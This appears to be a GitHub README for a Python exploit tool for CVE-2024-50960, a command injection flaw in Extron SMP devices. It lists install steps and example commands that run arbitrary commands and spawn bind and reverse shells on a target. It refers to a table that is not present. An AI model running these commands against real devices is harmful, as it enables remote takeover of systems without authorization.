![alt text](https://github.com/layer8secure/extron-smp-inject/blob/main/extron_inject.png?raw=true)

# CVE-2024-50960: Extron SMP OS Command Injection

By Ryan Roth [@f1rstm4tter](https://twitter.com/f1rstm4tter)
[www.layer8security.com](http://www.layer8security.com)

Advisory: [CVE-2024-50960: Exploiting Extron SMP Command Injection](https://ryanmroth.com/articles/exploiting-extron-smp-command-injection)

## Overview

This tool exploits [CVE-2024-50960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50960) — OS command injection vulnerabilities in Extron SMP devices. It allows web admins to execute arbitrary commands and spawn shells (both bind and reverse) on the underlying OS.

## April 17 Update: Additional Affected Device Identified

Further analysis has revealed that the [Extron SME 211](https://www.extron.com/product/sme211)
(firmware ≤ 3.02) is also vulnerable to CVE-2024-50960.

The [Key Details](#key-details) table above has been revised.

Organizations deploying the SMP 351H should follow the same
[mitigation strategies](#how-to-protect-your-organization), especially around patching and isolating
affected units.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Arguments](#arguments)
- [Examples](#examples)
- [Logging](#logging)
- [License](#license)

## Installation

To use this tool, you need Python 3.x and `pip` installed. Clone the repository and install the required packages:

```bash
git clone https://github.com/yourusername/extron-smp-inject.git
cd extron-smp-inject
pip install -r requirements.txt
```

## Usage

To run the tool, use the following command:

```bash
python extron_smp_inject.py <action> [options]
```

### Arguments

- `action`: The action to perform (either `command`, `bind`, or `reverse`).
- `rhost`: The target IP address (required).
- `rport`: The target port (80 or 443) (required).
- `--username`: The username for authentication (default: `admin`).
- `--password`: The password for authentication.
- `-v` or `--verbose`: Enable verbose logging.
- `--log-file`: Specify a log file to write logs to.

### Examples

**Execute an arbitrary command:**

```bash
python extron_smp_inject.py command --password admin whoami 192.168.1.1 443
```

**Spawn a bind shell:**

```bash
python extron_smp_inject.py bind --password admin 4444 192.168.1.1 443
```

**Spawn a reverse shell:**

```bash
python extron_smp_inject.py reverse --password admin 192.168.0.1 4444 192.168.1.1 443
```

## Logging

The tool supports logging output to the console and optionally to a file. You can enable verbose logging using the `-v` option, which provides more detailed output during execution.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Disclaimer

Ensure you have proper authorization before testing devices. Unauthorized access is illegal.
